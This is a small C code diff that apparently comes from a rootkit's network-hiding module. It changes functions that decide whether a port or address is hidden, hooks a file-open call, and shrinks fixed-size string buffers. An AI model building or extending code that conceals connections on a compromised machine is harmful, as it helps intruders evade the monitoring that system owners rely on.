@@ -39,8 +39,8 @@ int is_hidden_port(int port){
 }
 
 #ifdef HIDE_ADDRS
-static char *getanip(const char *addr){
-    char *ret, buf[32];
+char *getanip(const char *addr){
+    char *ret, buf[16];
     int a,b,c,d;
 
     sscanf(addr, "%2x%2x%2x%2x", &a,&b,&c,&d);
@@ -59,7 +59,7 @@ int is_hidden_addr(const char *addr){
     preparehideaddrs(readgid());
 
     FILE *fp;
-    char line[32], *ip;
+    char line[17], *ip;
     int status = 0;
 
     hook(CFOPEN);
